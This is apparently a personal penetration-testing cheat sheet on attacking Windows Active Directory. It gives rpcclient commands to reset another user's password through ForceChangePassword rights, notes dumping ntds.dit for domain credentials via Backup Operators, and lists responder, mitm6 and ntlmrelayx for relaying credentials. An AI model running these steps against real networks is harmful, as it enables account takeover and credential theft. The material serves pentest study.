# active directory 

## ForceChangePassword change user password
can exploit with impacket
payloadsallthethings "Active Directory Attack.md"
```bash
rpcclient $IP -U username -W domain.local
```
within rpcclient shell
```
setuserinfo2 targetuser 23 targetnewpwd
```

## Backup Operators group
permissions to back up files. can back up C drive to dump ntds.dit

## sensitive files
ntds.dit - domain credentials

## mindset and methodology
cycle:
- compromise creds
- access services
- abuse permissions to get more permissions

## workflow for penetration test on windows network in organization
- responder
- mitm6
  - combine with responder to attack ipv6 dns requests traffic
  - combine with ntlmrelayx
